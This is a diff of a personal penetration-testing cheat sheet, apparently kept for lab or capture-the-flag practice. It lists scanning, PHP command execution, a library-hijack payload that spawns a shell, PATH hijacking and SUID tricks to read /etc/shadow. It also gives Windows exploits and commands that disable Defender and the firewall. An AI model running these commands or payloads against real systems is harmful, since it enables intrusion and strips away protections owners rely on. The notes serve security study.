@@ -1,11 +1,15 @@
 # My Security Resources
 ## Scan
-### Services
+### Portscan
 - nmap
     - Parameters
         - `-A` : Enable OS detection, version detection, script scanning, and traceroute
         - `-p-` : Scan all ports
         - `-p 1000-9999` : Scan port from 1000 to 9999 
+    
+- RustScan
+	- `rustscan -a 10.10.166.15`
+### Services
 - enum4linux
     - Parameters
         - `-a` : Do all simple enumeration
@@ -18,6 +22,8 @@
 	- `echo passthru("whoami")`
 	- `echo shell_exec("whoami")` 
 	- `echo exec("whoami")`
+- Wrapper
+	- `php://filter/convert.base64-encode/resource=meow.php`
 ### Shell
 #### Web Shell
 - [b374k](https://github.com/b374k/b374k)
@@ -43,7 +49,7 @@
 		- Write web shell
 	- `save`
 		- Save file
-## Privilege
+## Privilege - Linux
 ### Software
 - [GTFOBins](https://gtfobins.github.io/)
     - Linux privileges escalation 
@@ -51,7 +57,31 @@
     - Scan the system to find which can be use for privileges escalation
 - [Pspy](https://github.com/DominicBreuker/pspy)
     - Monitor the process
-
+### Program Hijack
+#### Python
+- import library priority
+	1. local file
+	2. `python -c "import sys;print(sys.path)"`
+- Check file permission if it can be write 
+- Fake library file
+	```python
+	import pty
+	pty.spawn("/bin/bash")
+	```
+#### Bash
+- Relative path is from `$PATH`
+	- We can modify this by
+		- `PATH=/my/fake/path:$PATH ./binary`
+	- Fake path can contain the shell/reverse shell command fle
+### Capability
+- If the program has some special capability
+	- https://man7.org/linux/man-pages/man7/capabilities.7.html
+	- `CAP_SETUID`
+- Can do with [GTFOBins](https://gtfobins.github.io/)
+### Docker
+- `/.dockerenv`
+	- If exist, probably in docker 
+- Notice mount point
 ### SOP
 - Check `sudo -l`
 	- What file we can run as super user 
@@ -61,9 +91,29 @@
 - Check suid
 	- [xxd](https://gtfobins.github.io/gtfobins/xxd/#suid)
 		- Can `cat /etc/shadow`
+	- [env](https://gtfobins.github.io/gtfobins/env/#suid)
 - Check sudo version
 	- [CVE-2019-14287](https://www.exploit-db.com/exploits/47502)
 		- sudo < 1.2.28
+- Check $PATH / import library permission
+	- Program Hijack
+- Check capability
+	- Check if the program has some useful capability
+## Privilege - Windows
+### Exploit
+- [EternalBlue MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)
+### Bypass UAC
+- [CVE-2019-1388](http://blog.leanote.com/post/snowming/38069f423c76)
+### Turn off Defender / Firewall
+- 64 bit Powershell
+	- `%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe`
+-  Disable Realtime Monitoring 
+	-  `Set-MpPreference -DisableRealtimeMonitoring $true`
+-  Uninstall Defender
+	-  `Uninstall-WindowsFeature -Name Windows-Defender –whatif`
+	-  `Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet`
+-  Turn off firewall
+	- `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`
 ## Password Crack
 ### Software
 - Hydra
